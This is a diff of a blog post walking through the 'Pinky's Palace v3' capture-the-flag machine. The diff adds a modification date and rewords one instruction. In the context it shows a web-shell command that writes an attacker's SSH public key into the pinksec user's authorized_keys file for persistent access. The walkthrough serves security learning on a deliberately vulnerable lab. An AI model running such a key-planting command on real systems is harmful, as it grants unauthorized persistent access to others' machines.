@@ -1,6 +1,7 @@
 ---
 layout: post
 date: 2018-08-23 12:12:13 +0000
+last_modified_at: 2018-08-23 12:50:24 +0000
 title: "Pinky's Palace: v3 Walkthrough"
 subtitle: "Shells, Shells Everywhere"
 category: Walkthrough
@@ -326,7 +327,7 @@ Time to get shell for `pinksec`. Let's generate a SSH keypair on my local machin
 
 ![4f3f9c7d.png](/assets/images/posts/pinkys-palace-v3-walkthrough/4f3f9c7d.png)
 
-Copy the following command and execute in the web shell.
+Execute the following command in the web shell.
 
 ```
 mkdir /home/pinksec/.ssh; echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbTLpnI4gWcXU6GiD3VjMSSv6n5tEkeHvucJNpYnlRzaKnrmS9R+HEgNi5T7uNbTpI1W9YNrXWKrxpKiGkiMkZCzZw1bU0IDXUX5CgMF3TxZyrbgMZTETd3bu9T68XHU0XD8XmK+qFN8JiWRpzH3bNksPoZliRI1mhM5ucF2BguCe8d6Gki7D/KBJx4j125jrckJ8BEttmVSujyJx+MA/13yPpDz4M9Rx2OH68xmeWET5ZgmDeGFQLqDFYiB+let9t3jZEetEdd+VpdbSK8wrac6X1QcDH436Fp3hiDNOgjHF4P0LDK1GUuxrGxBDHz6InIueI5KNsvxlDlWDZFKU3 > /home/pinksec/.ssh/authorized_keys
